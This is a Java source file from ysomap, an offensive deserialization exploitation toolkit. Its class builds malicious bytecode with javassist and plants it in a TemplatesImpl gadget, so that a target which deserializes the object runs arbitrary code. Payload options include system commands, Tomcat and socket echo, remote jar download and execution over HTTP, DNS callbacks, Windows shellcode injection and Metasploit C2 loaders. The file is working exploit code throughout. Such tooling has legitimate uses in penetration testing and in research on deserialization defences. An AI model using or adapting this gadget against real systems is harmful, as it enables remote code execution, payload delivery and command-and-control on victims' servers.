package ysomap.bullets.jdk;



import loader.RemoteFileHttpExecutor;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import echo.SocketEchoPayload;
import echo.TomcatEchoPayload;
import javassist.*;
import loader.*;
import c2.*;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Strings;
import ysomap.core.util.ClassFiles;
import ysomap.core.util.FileHelper;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.UUID;
import java.util.zip.GZIPOutputStream;

/**
 * 编译恶意类，并填充到TemplatesImpl
 * 共有以下选择
 * 1. 命令执行
 *    set type cmd
 *
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Bullets
@Dependencies({"jdk"})
@Authors({ Authors.WH1T3P1G })
@Targets({Targets.JDK})
@Details("载入恶意class字节码，并执行任意代码，依赖TemplatesImpl")
public class TemplatesImplBullet extends AbstractBullet<Object> {

    private Class templatesImpl;
    private Class abstractTranslet;
    private Class transformerFactoryImpl;

    @NotNull
    @Require(name = "type", detail = "5种方式（cmd,code,socket,loader,shellcode）:\n" +
            "1. cmd，body写入具体的系统命令；\n" +
            "2. code, body写入具体需要插入执行的代码；\n" +
            "3. socket, body写入`ip:port`\n" +
            "4. loader, body写入远程恶意Jar地址，写入格式如 `url;classname` 或 `url;os`\n" +
            "5. c2, body写入C2相关参数，写入格式如 `path` 或 `url`, 具体查看相关 c2 说明 ")
    private String type = "cmd";

    @NotNull
    @Require(name = "body" ,detail = "evil code body")
    private String body = "";

    @NotNull
    @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
            "可选default、" +
            "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、RunClassLoader")
    private String effect = "default";

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    public String action = "outputProperties";

    @Override
    public Object getObject() throws Exception {
        String processedBody = body;
        if("cmd".equals(type)){
            if("false".equals(exception)){
                processedBody = PayloadHelper.makeRuntimeExecPayload(processedBody);
            }else{
                processedBody = PayloadHelper.makeExceptionPayload(processedBody);
            }
        }else if("code".equals(type) || "socket".equals(type) || "loader".equals(type) || "c2".equals(type)){
            // do nothing
        }

        initClazz();
        // create evil bytecodes
        byte[] bytecodes = makeEvilByteCode(processedBody);
        // arm evil bytecodes
        Object templates = templatesImpl.newInstance();
        // inject class bytes into instance
        ReflectionHelper.setFieldValue(templates, "_bytecodes", new byte[][] { bytecodes });
        ReflectionHelper.setFieldValue(templates, "_name", UUID.randomUUID().toString());
        ReflectionHelper.setFieldValue(templates, "_tfactory", transformerFactoryImpl.newInstance());
        return templates;
    }

    private byte[] makeEvilByteCode(String body) throws NotFoundException, CannotCompileException, IOException {
        ClassPool pool = new ClassPool(true);
        CtClass cc = null;
        String code = null;

        if("default".equals(effect)){
            cc = ClassFiles.makeClassFromExistClass(pool,
                    StubTransletPayload.class,
                    new Class<?>[]{abstractTranslet}
            );
            code = body;
        }else if("TomcatEcho".equals(effect)){
            cc = ClassFiles.makeClassFromExistClass(pool,
                    TomcatEchoPayload.class,
                    new Class<?>[]{abstractTranslet}
            );
            cc.setName("TomcatEcho"+System.currentTimeMillis());
        }else if("SocketEcho".equals(effect)){
            String[] remote = body.split(":");
            code = "host=\""+remote[0]+"\";\nport="+remote[1]+";";
            pool.appendClassPath(new ClassClassPath(SocketEchoPayload.class));
            cc = pool.getCtClass(SocketEchoPayload.class.getName());
            cc.setName("SocketEcho"+System.currentTimeMillis());
        }else if("RemoteFileLoader".equals(effect)){
            String[] remote = body.split(";");
            code = "url=\""+remote[0]+"\";\nclassname=\""+remote[1]+"\";";
            pool.appendClassPath(new ClassClassPath(RemoteFileLoader.class));
            cc = pool.getCtClass(RemoteFileLoader.class.getName());
            cc.setName("Loader"+System.currentTimeMillis());
        }else if("RemoteFileHttpLoader".equals(effect)){
            String[] remote = body.split(";");
            code = "url=\""+remote[0]+"\";\nclassname=\""+remote[1]+"\";";
            pool.appendClassPath(new ClassClassPath(RemoteFileHttpLoader.class));
            cc = pool.getCtClass(RemoteFileHttpLoader.class.getName());
            cc.setName("Loader"+System.currentTimeMillis());
        }else if("RemoteFileHttpExecutor".equals(effect)){
            String[] remote = body.split(";");
            code = "url=\""+remote[0]+"\";\nos=\""+remote[1]+"\";";
            pool.appendClassPath(new ClassClassPath(RemoteFileHttpExecutor.class));
            cc = pool.getCtClass(RemoteFileHttpExecutor.class.getName());
            cc.setName("Loader"+System.currentTimeMillis());
        }else if("DnslogLoader".equals(effect)){
            code = "dnslog=\""+body+"\";";
            pool.appendClassPath(new ClassClassPath(DnslogLoader.class));
            cc = pool.getCtClass(DnslogLoader.class.getName());
            cc.setName("Loader"+System.currentTimeMillis());
        }else if("WinC2Loader".equals(effect)){
            byte[] shellcode = FileHelper.getFileContent(body);
            String shellcodeStr = Arrays.toString(shellcode);
            code = "shellcode = new byte[]{" + shellcodeStr.substring(1, shellcodeStr.length() - 1) +  "};";
            pool.appendClassPath(new ClassClassPath(WinC2Loader.class));
            cc = pool.getCtClass(WinC2Loader.class.getName());
            cc.setName("ShellCode"+System.currentTimeMillis());
        }else if("MSFJavaC2Loader".equals(effect)){
            code = "url=\""+body+"\";";
            pool.appendClassPath(new ClassClassPath(MSFJavaC2Loader.class));
            cc = pool.getCtClass(MSFJavaC2Loader.class.getName());
            cc.setName("MSFJavaC2Loader"+System.currentTimeMillis());
        }else if ("RunClassLoader".equals(effect)){
            Path path = Paths.get(body);
            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
            gzipOutputStream.write(Files.readAllBytes(path));
            gzipOutputStream.close();
            code = String.format("classBae64Str = \"%s\";", Strings.base64ToString(outBuf.toByteArray()));

            Class targetClass = RunClassLoader.class;
            pool.appendClassPath(new ClassClassPath(targetClass));
            cc = pool.getCtClass(targetClass.getName());
            cc.setName(targetClass.getName()+System.currentTimeMillis());
        }

        if(cc != null){
            if(code != null){
                ClassFiles.insertStaticBlock(cc, code);
            }
            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
            return cc.toBytecode();
        }else{
            return new byte[0];
        }
    }

    private void initClazz() throws ClassNotFoundException {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            templatesImpl = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstractTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transformerFactoryImpl = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            templatesImpl = TemplatesImpl.class;
            abstractTranslet = AbstractTranslet.class;
            transformerFactoryImpl = TransformerFactoryImpl.class;
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;

        public StubTransletPayload(){
            transletVersion = 101;
        }

        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}

        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }


    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TemplatesImplBullet();
        bullet.set("type", args[0]);
        bullet.set("body", args[1]);
        bullet.set("effect", args[2]);
        bullet.set("exception", args[3]);
        return bullet;
    }
}
